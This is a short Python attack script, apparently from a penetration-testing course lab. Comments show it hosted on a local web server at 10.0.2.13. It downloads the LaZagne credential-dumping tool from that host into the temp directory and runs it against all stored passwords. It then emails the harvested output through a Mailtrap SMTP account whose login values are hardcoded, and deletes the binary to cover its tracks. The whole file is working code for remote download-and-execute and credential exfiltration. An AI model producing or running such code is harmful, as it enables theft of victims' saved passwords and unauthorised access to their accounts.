# cp download_execute_and_report.py /var/www/html/evil-files
# service apache2 start
# http://10.0.2.13/evil-files/

import requests
import subprocess
import smtplib
import re
import os
import tempfile


def download(url):
    response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, 'wb') as out_file:
        out_file.write(response.content)


def send_mail(username, password, email, message):
    server = smtplib.SMTP('smtp.mailtrap.io', 2525)
    server.starttls()
    server.login(username, password)
    server.sendmail(email, email, message)  # sender, receiver, message
    server.quit()


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download('http://10.0.2.13/evil-files/lazagne.exe')
result = subprocess.check_output('lazagne.exe all', shell=True)
send_mail('b06ffc432e3884', 'a5e72032e9c491', 'to@smtp.mailtrap.io', result)
os.remove('lazagne.exe')
